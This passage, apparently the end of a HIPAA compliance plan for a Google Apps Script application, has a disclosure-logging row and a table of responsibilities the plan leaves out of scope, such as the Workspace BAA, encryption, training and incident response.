| **7 — Disclosure Logging** | (always active when sheets exist) | No disclosure sheet → no logging | Disclosure sheet exists → all disclosures logged |

---

## What This Plan Does NOT Cover

These items are outside the scope of the GAS application layer and belong to organizational policy, infrastructure, or Google Workspace administration:

| Item | Responsibility | Notes |
|------|--------------|-------|
| **Google Workspace BAA** | Organization admin | Must be signed before any PHI touches Google services |
| **Network security** | Google platform | TLS everywhere — handled automatically |
| **Encryption at rest** | Google platform | Google Sheets encrypts at rest by default under BAA |
| **Physical security** | Google data centers | Covered by Google's SOC 2 / ISO 27001 certifications |
| **Workforce training** | Organization HR/compliance | HIPAA requires annual security awareness training |
| **Business associate agreements** | Organization legal | Required for any third-party service that handles PHI |
| **Incident response plan** | Organization compliance | Documented procedures for breach notification (§ 164.408) |
| **Risk assessment** | Organization compliance | Annual HIPAA risk assessment required (§ 164.308(a)(1)) |

Developed by: LightAISolutions
